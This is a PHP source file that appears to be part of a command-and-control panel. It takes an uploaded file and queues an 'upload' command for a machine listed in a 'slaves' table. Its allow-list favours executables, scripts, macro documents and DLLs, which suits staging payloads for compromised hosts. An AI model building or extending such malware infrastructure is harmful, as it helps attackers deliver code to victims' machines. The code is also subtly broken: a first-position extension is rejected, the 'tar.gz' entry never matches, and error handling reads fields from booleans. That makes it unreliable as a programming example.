<?php
function uploadFile($file_array, $conn, $name)
{
    $file_name = $file_array["name"];
    $tmp_name = $file_array["tmp_name"];
    $uploads_dir = 'sfiles/'; //Directory to upload files.
    $ext = pathinfo($file_name, PATHINFO_EXTENSION);
    $allowedExtension = array(
        "png",
        "jpg",
        "jpeg",
        "gif",
        "mp3",
        "mp4",
        "mov",
        "exe",
        "elf",
        "bin",
        "sh",
        "ps1",
        "psd1",
        "py",
	"cs",
	"c",
	"cpp",
        "hta",
        "vba",
        "vbs",
	"asp",
	"aspx",
        "dll",
        "rar",
        "zip",
        "tar.gz",
        "7z",
        "txt",
        "doc",
	"docm",
        "docx",
        "xls",
	"xlsx",
	"xlsm",
        "ppt",
        "pptx",
	"pdf",
        "md"
    );

    if (array_search($ext, $allowedExtension))
    {
        $nameWithEntropy = uniqid();
        $saveName = $nameWithEntropy . "." . $ext;
        $savePath = $uploads_dir . $saveName;
        $downloadCommand = "upload " . $savePath;
        if (move_uploaded_file($tmp_name, $savePath))
        {
            $addFilePath = $conn->prepare("UPDATE slaves set slaveCommand=? where slaveId=?");
            if ($addFilePath !== false)
            {
                $errorControl = $addFilePath->bind_param("ss", $downloadCommand, $name);
                if ($errorControl !== false)
                {
                    $errorControl = $addFilePath->execute();
                    if ($errorControl === false)
                    {
                        return "An error occured: " . $errorControl->error;
                    }
		   else{
				return "OK";
			}
                }
                else
                {
                    return "An error occured: " . $errorControl->error;
                }
            }
            else
            {
                return "An error occured: " . $addFilePath->error;
            }

        }

        else
        {
            return "File upload operation failed.";
        }

    }
    else 
      return "File extension is not allowed. Do no try to upload php, html or js.";
}
?>
